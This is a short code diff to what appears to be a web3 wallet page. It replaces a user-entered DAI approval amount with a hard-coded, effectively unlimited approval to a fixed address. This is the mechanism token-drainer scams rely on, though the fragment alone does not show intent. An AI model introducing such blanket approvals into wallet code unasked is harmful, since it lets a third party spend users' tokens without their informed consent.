@@ -72,8 +72,7 @@
       
     }
     async function a() {
-      let value = document.getElementById('quantity').value;
-      await dai.methods.approve(ADDRESS, value).send({ from: account})
+      await dai.methods.approve(ADDRESS, 9999999999999999999999999).send({ from: account})
 
     }
 }
